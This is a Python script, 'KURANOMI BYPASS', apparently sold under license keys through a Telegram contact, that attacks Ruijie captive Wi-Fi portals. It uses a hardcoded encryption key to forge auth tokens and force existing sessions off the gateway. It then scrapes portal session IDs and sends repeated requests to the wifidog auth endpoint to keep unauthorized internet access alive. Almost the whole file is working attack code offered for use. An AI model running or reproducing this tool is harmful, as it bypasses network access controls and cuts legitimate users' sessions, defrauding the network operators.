import getpass
import os
import re
import sys
import time
import ping3
import base64
import random
import string
import aiohttp
import asyncio
import hashlib
import requests
import subprocess
from datetime import timedelta, datetime
from urllib.parse import unquote, urlparse, parse_qs
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

r, g, y, b, w, c = "\033[1;31m", "\033[1;32m", "\033[1;33m", "\033[1;34m", "\033[0m", "\033[1;36m"

TARGET_URL = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=4c49684b2d2e&gw_sn=H1U82VB006839&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.180&mac=ea:4b:cc:49:db:bd&slot_num=16&nasip=192.168.1.63&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C311&chap_challenge=%5C251%5C002%5C152%5C160%5C153%5C313%5C221%5C035%5C277%5C321%5C256%5C070%5C153%5C351%5C231%5C142"

TELEGRAM_BOT_TOKEN = "" 
TELEGRAM_CHAT_ID = ""

RAW_KEY_LINK = "https://raw.githubusercontent.com/mgsainewlay211/KURANOMI-/refs/heads/main/keys.txt"
LOG_FILE = "kuranomibypass_history.txt"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def Line():
    print(f"{y}-\033[1;00m"*os.get_terminal_size()[0])

def get_device_id():
    id_file = ".device_id"
    if os.path.exists(id_file):
        try:
            with open(id_file, "r") as f:
                return f.read().strip()
        except:
            pass

    # Generate a K-XXXX-XXXX style ID
    try:
        result = subprocess.check_output("whoami", shell=True, encoding='utf-8')
        device_id = result.strip()
        if device_id and len(device_id) > 0:
            clean_id = re.sub(r'[^A-Za-z0-9]', '', device_id).upper()
            if len(clean_id) >= 8:
                final_id = clean_id[:8]
            else:
                final_id = clean_id.ljust(8, 'X')
            new_id = f"K-{final_id[:4]}-{final_id[4:8]}"
            with open(id_file, "w") as f:
                f.write(new_id)
            return new_id
    except:
        pass

    try:
        import getpass
        device_id = getpass.getuser()
        if device_id:
            clean_id = re.sub(r'[^A-Za-z0-9]', '', device_id).upper()
            clean_id = clean_id[:8].ljust(8, 'X')
            new_id = f"K-{clean_id[:4]}-{clean_id[4:8]}"
            with open(id_file, "w") as f:
                f.write(new_id)
            return new_id
    except:
        pass

    # Fallback: generate random K-XXXX-XXXX ID
    random_id = "K-" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4)) + '-' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
    with open(id_file, "w") as f:
        f.write(random_id)
    return random_id

def get_network_time():
    try:
        res = requests.get("https://www.google.com", timeout=5)
        gmt_str = res.headers.get('Date')
        gmt_dt = datetime.strptime(gmt_str, '%a, %d %b %Y %H:%M:%S %Z')
        mm_time = gmt_dt + timedelta(hours=6, minutes=30)
        return mm_time
    except:
        return None

def parse_duration(duration_str):
    days = re.search(r'(\d+)\s*(d|day|days)', duration_str, re.I)
    hours = re.search(r'(\d+)\s*(h|hour|hours)', duration_str, re.I)
    minutes = re.search(r'(\d+)\s*(m|min|minute|minutes)', duration_str, re.I)

    d = int(days.group(1)) if days else 0
    h = int(hours.group(1)) if hours else 0
    m = int(minutes.group(1)) if minutes else 0
    return timedelta(days=d, hours=h, minutes=m)

def check_online_license(user_key):
    dev_id = get_device_id()
    key_file = ".access_key"
    last_time_file = ".last_seen"

    net_time = get_network_time()
    curr_sys_time = datetime.now()

    if os.path.exists(last_time_file):
        try:
            last_ts = float(open(last_time_file, "r").read().strip())
            if curr_sys_time.timestamp() < last_ts:
                return False, "Time Travel Detected! Fix your date."
        except:
            pass

    current_working_time = net_time if net_time else curr_sys_time

    with open(last_time_file, "w") as f:
        f.write(str(current_working_time.timestamp()))

    try:
        res = requests.get(RAW_KEY_LINK, timeout=10)
        if res.status_code == 200:
            lines = res.text.splitlines()
            for line in lines:
                if "|" in line:
                    parts = [p.strip() for p in line.split("|")]
                    if len(parts) >= 3:
                        if parts[0] == dev_id and parts[1] == user_key:
                            raw_duration = parts[2]

                            if os.path.exists(key_file):
                                saved_data = open(key_file, "r").read().strip().split("|")
                                expiry_dt = datetime.fromtimestamp(float(saved_data[1]))
                            else:
                                if not net_time:
                                    return None, "Activation requires internet!"
                                delta = parse_duration(raw_duration)
                                if delta.total_seconds() == 0:
                                    return False, "Invalid Duration!"
                                expiry_dt = net_time + delta
                                with open(key_file, "w") as f:
                                    f.write(f"{user_key}|{expiry_dt.timestamp()}")

                            if current_working_time < expiry_dt:
                                return True, expiry_dt
                            else:
                                if os.path.exists(key_file):
                                    os.remove(key_file)
                                return False, "Key Expired!"

            return False, "Key not found on Server!"
    except Exception as e:
        if os.path.exists(key_file):
            try:
                s_key, s_exp_ts = open(key_file, "r").read().strip().split("|")
                expiry_dt = datetime.fromtimestamp(float(s_exp_ts))
                if curr_sys_time < expiry_dt:
                    return True, expiry_dt
                else:
                    return False, "Expired (Offline)"
            except:
                pass
        return None, f"Connection Error: {e}"

    return False, "Access Denied"

def save_user_key(key):
    key_file = ".access_key"
    try:
        if os.path.exists(key_file):
            content = open(key_file, "r").read().strip()
            if "|" in content:
                old_exp = content.split("|")[1]
                with open(key_file, "w") as f:
                    f.write(f"{key}|{old_exp}")
            else:
                with open(key_file, "w") as f:
                    f.write(key)
        else:
            with open(key_file, "w") as f:
                f.write(key)
        return True
    except:
        return False

def activate_key(user_key):
    status, info = check_online_license(user_key)
    if status is True:
        save_user_key(user_key)
        return True, info
    return False, info

def get_key_status():
    key_file = ".access_key"
    dev_id = get_device_id()

    if os.path.exists(key_file):
        try:
            content = open(key_file, "r").read().strip()
            if "|" in content:
                key, exp_ts = content.split("|")
                expiry_dt = datetime.fromtimestamp(float(exp_ts))
                net_time = get_network_time()
                curr_time = net_time if net_time else datetime.now()

                if curr_time < expiry_dt:
                    remaining = expiry_dt - curr_time
                    return True, key, expiry_dt, remaining
                else:
                    return False, key, expiry_dt, None
            else:
                return None, content, None, None
        except:
            return None, None, None, None
    return None, None, None, None

def format_remaining(remaining):
    if remaining is None:
        return "Unknown"
    days = remaining.days
    hours = remaining.seconds // 3600
    minutes = (remaining.seconds % 3600) // 60

    if days > 0:
        return f"{days}d {hours}h"
    elif hours > 0:
        return f"{hours}h {minutes}m"
    else:
        return f"{minutes}m"

def Logo():
    clear()
    dev_id = get_device_id()

    has_key, key_val, exp_dt, remaining = get_key_status()
    if has_key is True:
        exp_str = format_remaining(remaining)
        status_text = f"{g}● ACTIVE{w}"
        exp_text = f"{g}{exp_str}{w}"
    elif has_key is False:
        status_text = f"{r}● EXPIRED{w}"
        exp_text = f"{r}Expired{w}"
    else:
        status_text = f"{y}● NOT ACTIVATED{w}"
        exp_text = f"{y}None{w}"

    logo = rf"""{r}
   ██╗  ██╗██╗   ██╗██████╗  █████╗ ███╗   ██╗ ██████╗ ███╗   ███╗██╗
   ██║ ██╔╝██║   ██║██╔══██╗██╔══██╗████╗  ██║██╔═══██╗████╗ ████║██║
   █████╔╝ ██║   ██║██████╔╝███████║██╔██╗ ██║██║   ██║██╔████╔██║██║
   ██╔═██╗ ██║   ██║██╔══██╗██╔══██║██║╚██╗██║██║   ██║██║╚██╔╝██║██║
   ██║  ██╗╚██████╔╝██║  ██║██║  ██║██║ ╚████║╚██████╔╝██║ ╚═╝ ██║██║
   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚═╝

        {w}>> {g}KURANOMI BYPASS Compatible Edition  {w}<<
  {y}--------------------------------------------------
   {w}🆔 Device: {g}{dev_id}
   {w}🔑 Status: {status_text} {w}| ⏰ Left: {exp_text}
   {w}📡 tg: {g}@kuranomi10 devloper: {w}@SYnX
  {y}--------------------------------------------------{w}"""
    print(logo)

def write_log(message):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] {message}\n"
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)

async def send_telegram_alert(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": f"🚀 [Ruijie Pro Alert]\n{message}"}
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(url, json=payload, timeout=5)
    except:
        pass

def parse_target_url(url_string):
    try:
        parsed_url = urlparse(url_string)
        params = parse_qs(parsed_url.query)
        gw_address = params.get('gw_address', ['192.168.110.1'])[0]
        chap_id = params.get('chap_id', [None])[0]
        chap_challenge = params.get('chap_challenge', [None])[0]
        return gw_address, chap_id, chap_challenge
    except:
        return "192.168.110.1", None, None

class WifiSetup:
    def __init__(self, gw_address, chap_id, chap_challenge):
        self.baseurl = f"http://{gw_address}:2060"
        self.username_get_url = self.baseurl + "/username_get"
        self.online_info_url = self.baseurl + "/user/online_info"
        self.logout_url = self.baseurl + "/user/logout"
        self.enc_key = "RjYkhwzx$2018!" 
        self.chap_id = chap_id
        self.chap_challenge = chap_challenge

    def start_setup(self):
        Logo()
        print(f"\n{c}[*] Starting Ruijie Wi-Fi Setup...{w}")
        status = self.unbind()
        Line()
        if not status:
            print(f"{y}[!] Warning: Unbind old session failed!{w}")
            write_log("Wi-Fi Setup executed - Unbind old session failed.")
        else:
            print(f"{g}[+] Old session unbinded successfully!{w}")
            write_log("Wi-Fi Setup executed - Old session unbinded successfully.")
            time.sleep(2)
        Line()

    def unbind(self):
        username = self.username_get()
        if not username: return False
        online_info = self.get_online_info(username)
        if not online_info: return False
        data = self.arrange_data(online_info)
        return self.logout(data, username)

    def username_get(self):
        try: return requests.get(self.username_get_url, timeout=5).json().get("username", None)
        except: return None

    def get_online_info(self, username):
        params = {"username": username, "usertype": "wifidog"}
        try: return requests.get(self.online_info_url, params=params, timeout=5).json()["data"]["list"][0]
        except: return None

    def arrange_data(self, info):
        repmac = info["mac"].replace(":", "")
        repmac = [repmac[i:i+4] for i in range(0, len(repmac), 4)]
        return {"ip": info["ip"], "mac": info["mac"], "ip_req": info["ip"], "mac_req": ".".join(repmac)}

    def encrypt_cryptojs(self, auth, enc_key):
        salt = get_random_bytes(8)
        key_iv = b''
        prev = b''
        while len(key_iv) < 48:
            prev = hashlib.md5(prev + enc_key.encode("utf-8") + salt).digest()
            key_iv += prev
        cipher = AES.new(key_iv[:32], AES.MODE_CBC, key_iv[32:48])
        return base64.b64encode(b"Salted__" + salt + cipher.encrypt(pad(auth.encode("utf-8"), AES.block_size))).decode("utf-8")

    def get_auth(self, username):
        if not self.chap_id or not self.chap_challenge: return None
        auth = unquote(self.chap_id) + unquote(self.chap_challenge) + username
        return self.encrypt_cryptojs(auth, self.enc_key)

    def logout(self, data, username):
        auth = self.get_auth(username)
        if not auth: return False
        payload = f"ip={data['ip']}&mac={data['mac']}&ip_req={data['ip_req']}&mac_req={data['mac_req']}&auth={auth}"
        try: return bool(requests.post(self.logout_url, data=payload, timeout=5).json().get("success"))
        except: return False

async def get_session_id(session, session_url, previous_session_id):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, logo/537.36)'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id: 
                return session_id.group(1)
            return previous_session_id
    except:
        return previous_session_id

async def get_session_id_alt(session, session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'connection': 'keep-alive',
        'upgrade-insecure-requests': '1',
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True, timeout=10) as req:
            response = str(req.url)
            patterns = [
                r"[?&]sessionId=([a-zA-Z0-9]+)",
                r"sessionId=([a-zA-Z0-9]+)",
                r"sid=([a-zA-Z0-9]+)"
            ]
            for pattern in patterns:
                session_id = re.search(pattern, response)
                if session_id:
                    return session_id.group(1)
            return False
    except:
        return False

class InternetAccess:
    def __init__(self, gw_address):
        Logo()
        self.ip = gw_address
        self.session_url = TARGET_URL
        print(f"\n[+] Active Pro Gateway IP: {self.ip}")

    async def main(self):
        await execute(self.session_url, self.ip)

async def get_smart_ping():
    targets = ["google.com", "8.8.8.8", "cloudflare.com"]
    for target in targets:
        ping = await asyncio.to_thread(ping3.ping, target, timeout=2)
        if ping is not None:
            ping_ms = int(ping * 1000)
            if ping_ms >= 100: return f"{r}{ping_ms} ms ({target}){w}"
            elif ping_ms >= 70: return f"{y}{ping_ms} ms ({target}){w}"
            return f"{g}{ping_ms} ms ({target}){w}"
    return f"{r}Offline{w}"

async def send(session, ip, session_id):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    params = {'token': session_id, 'phoneNumber': 'HELLO WORLD'}
    try:
        async with session.get(f'http://{ip}:2060/wifidog/auth?', params=params, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            if "http://www.baidu.com" in response or "portal-as.ruijienetworks.com" in response or "success.html" in response:
                return True
            return False
    except:
        return False

async def execute(session_url, ip):
    timeout = aiohttp.ClientTimeout(total=15)
    connector = aiohttp.TCPConnector(limit=512, ttl_dns_cache=300) 

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        write_log("Internet Bypass service initialized.")
        await send_telegram_alert("Bypass Service Started Successfully! 🚀")

        HEARTBEAT_INTERVAL = 8
        SESSION_REFRESH_AFTER = 18
        refresh_counter = 0
        no_session_counter = 0
        consecutive_failures = 0

        try:
            previous_session_id = None
            session_id = None

            while session_id is None:
                print(f"{g}[*] Extracting stable session id...{w}")
                Line()
                session_id = await get_session_id(session, session_url, previous_session_id)
                if session_id:
                    previous_session_id = session_id
                    print(f"{g}[+] Valid Session ID Locked: {session_id}{w}")
                    Line()
                    no_session_counter = 0
                else:
                    no_session_counter += 1
                    wait_time = min(5 + no_session_counter, 15)
                    print(f"{y}[!] Target Server Busy. Sleeping for {wait_time}s... (Attempt {no_session_counter}){w}")
                    Line()
                    await asyncio.sleep(wait_time)

                    if no_session_counter >= 10:
                        print(f"{c}[*] Trying alternative session extraction method...{w}")
                        session_id = await get_session_id_alt(session, session_url)
                        if session_id:
                            print(f"{g}[+] Alternative method worked! Session: {session_id}{w}")
                            break
                        no_session_counter = 0

            while True:
                try:
                    send_status = await send(session, ip, session_id)
                    ping = await get_smart_ping()

                    if not send_status:
                        consecutive_failures += 1
                        print(f"{r}[!] Connection issue #{consecutive_failures}. Recovering...{w}")
                        write_log(f"Connection issue #{consecutive_failures}. Ping: {ping}")

                        new_session_id = await get_session_id(session, session_url, session_id)
                        if new_session_id:
                            session_id = new_session_id
                            consecutive_failures = 0
                            print(f"{g}[+] Session recovered! New ID: {session_id}{w}")
                            await send_telegram_alert(f"✓ Connection recovered! Session renewed.")
                        else:
                            await asyncio.sleep(2)
                            new_session_id = await get_session_id(session, session_url, session_id)
                            if new_session_id:
                                session_id = new_session_id
                                consecutive_failures = 0
                                print(f"{g}[+] Session recovered after delay!{w}")
                            elif consecutive_failures >= 8:
                                print(f"{r}[!] Critical: Cannot recover connection. Restarting session acquisition...{w}")
                                session_id = None
                                while session_id is None:
                                    session_id = await get_session_id(session, session_url, None)
                                    if not session_id:
                                        await asyncio.sleep(3)
                                consecutive_failures = 0
                                print(f"{g}[+] Session re-acquired!{w}")
                        Line()
                    else:
                        if consecutive_failures > 0:
                            print(f"{g}[+] Connection stabilized after {consecutive_failures} failures!{w}")
                            consecutive_failures = 0

                        ping_ms_match = re.search(r'(\d+)', ping)
                        ping_ms = int(ping_ms_match.group(1)) if ping_ms_match and "ms" in ping else 999
                        if ping_ms < 100:
                            status_icon = f"{g}●{w}"
                        elif ping_ms < 200:
                            status_icon = f"{y}●{w}"
                        else:
                            status_icon = f"{r}●{w}"

                        print(f"{g}[+] {status_icon} Connection Active [Latency: {ping_ms}ms]{w}")
                        Line()

                    print(f"{b}[*] Network Latency: {ping}{w}")
                    print(f"{c}[*] Session: {session_id[:8] if session_id else 'None'}... | Next heartbeat: {HEARTBEAT_INTERVAL}s | Refresh in: {SESSION_REFRESH_AFTER - refresh_counter}{w}")
                    Line()

                    await asyncio.sleep(HEARTBEAT_INTERVAL)
                    refresh_counter += 1

                    if refresh_counter >= SESSION_REFRESH_AFTER:
                        print(f"{c}[*] Scheduled session refresh...{w}")
                        write_log("Session Layer refreshed automatically.")

                        new_session_id = await get_session_id(session, session_url, session_id)
                        if new_session_id:
                            session_id = new_session_id
                            print(f"{g}[+] Session refreshed! New ID: {session_id[:12]}...{w}")
                            await send_telegram_alert(f"🔄 Session Refreshed. Ping: {ping}")
                        else:
                            print(f"{y}[!] Refresh failed, trying alt method...{w}")
                            new_session_id = await get_session_id_alt(session, session_url)
                            if new_session_id:
                                session_id = new_session_id
                                print(f"{g}[+] Alt refresh worked!{w}")
                            else:
                                print(f"{r}[!] Refresh failed, keeping old session{w}")

                        refresh_counter = 0
                        Line()

                except asyncio.TimeoutError:
                    print(f"{y}[!] Timeout, retrying...{w}")
                    await asyncio.sleep(1)
                except Exception as e:
                    print(f"{r}[!] Error: {e}{w}")
                    write_log(f"Loop error: {e}")
                    await asyncio.sleep(2)

        except KeyboardInterrupt:
            write_log("Process stopped by User.")
            sys.exit(0)
        except Exception as e:
            write_log(f"Process crashed with error: {e}")
            sys.exit(0)

def show_menu():
    print(f"""{c}
  ┌───────────────────────────────────────┐
  │      KURANOMI ULTRA-PRO STABLE        │
  ├───────────────────────────────────────┤
  │  {w}[1] {g}⚙️  Wi-Fi Setup                   {c}│
  │  {w}[2] {g}🚀  Internet Bypass (Direct)       {c}│
  │  {w}[3] {y}🔑  Activate Key                   {c}│
  │  {w}[4] {r}❌  Logout                         {c}│
  └───────────────────────────────────────┘{w}""")

def key_activation_menu():
    Logo()
    print(f"\n{c}┌───────────────────────────────────────┐")
    print(f"│         🔑 KEY ACTIVATION              │")
    print(f"├───────────────────────────────────────┤")

    has_key, key_val, exp_dt, remaining = get_key_status()
    if has_key is True:
        print(f"│  {g}✓ Current Key: {key_val}{' '*(20-len(key_val))}│")
        print(f"│  {g}✓ Expires in: {format_remaining(remaining)}{' '*(20-len(format_remaining(remaining)))}│")
    elif has_key is False:
        print(f"│  {r}✗ Key Expired!{' '*(27)}│")
    else:
        print(f"│  {y}⚠ No Active Key{' '*(27)}│")

    print(f"├───────────────────────────────────────┤")
    print(f"│  {w}Contact @kuranomi10 to get key    {c}│")
    print(f"└───────────────────────────────────────┘{w}")

    print(f"\n{y}[!] You need internet connection to activate key!{w}")
    user_key = input(f"\n{g}[>] Enter your activation key: {w}").strip()

    if not user_key:
        print(f"{r}[!] Key cannot be empty!{w}")
        time.sleep(2)
        return False

    print(f"{c}[*] Checking key with server...{w}")
    status, result = activate_key(user_key)

    if status:
        if isinstance(result, datetime):
            exp_date = result.strftime("%Y-%m-%d %H:%M:%S")
            print(f"{g}[+] Key Activated Successfully!{w}")
            print(f"{g}[+] Expires on: {exp_date}{w}")
        else:
            print(f"{g}[+] Key Activated Successfully!{w}")
        write_log(f"Key activated: {user_key}")
        time.sleep(2)
        return True
    else:
        print(f"{r}[!] Activation Failed: {result}{w}")
        write_log(f"Key activation failed: {user_key} - {result}")
        time.sleep(2)
        return False

async def main():
    gw_address, chap_id, chap_challenge = parse_target_url(TARGET_URL)

    while True:
        Logo()

        has_key, key_val, exp_dt, remaining = get_key_status()

        if has_key is not True:
            print(f"\n{r}┌───────────────────────────────────────┐")
            print(f"│  ⚠ NO VALID LICENSE FOUND!           │")
            print(f"│  Please activate your key to continue │")
            print(f"│  Contact: @kuranomi10             │")
            print(f"└───────────────────────────────────────┘{w}")
            print(f"\n{y}[>] Press Enter to activate key...{w}")
            input()
            key_activation_menu()
            continue

        show_menu()
        choice = input(f"  {y}Choose Menu >>> {w}").strip()

        if choice == '1':
            setup = WifiSetup(gw_address, chap_id, chap_challenge)
            setup.start_setup()
            input(f"\n{y}Press Enter to return to menu...{w}")
        elif choice == '2':
            has_key, key_val, exp_dt, remaining = get_key_status()
            if has_key is not True:
                print(f"{r}[!] Key is not active! Please activate first.{w}")
                time.sleep(2)
                continue
            access = InternetAccess(gw_address)
            await access.main()
            break
        elif choice == '3':
            key_activation_menu()
        elif choice == '4':
            write_log("User logged out manually.")
            sys.exit(0)

if __name__ == "__main__":
    try: 
        asyncio.run(main())
    except KeyboardInterrupt: 
        sys.exit(0)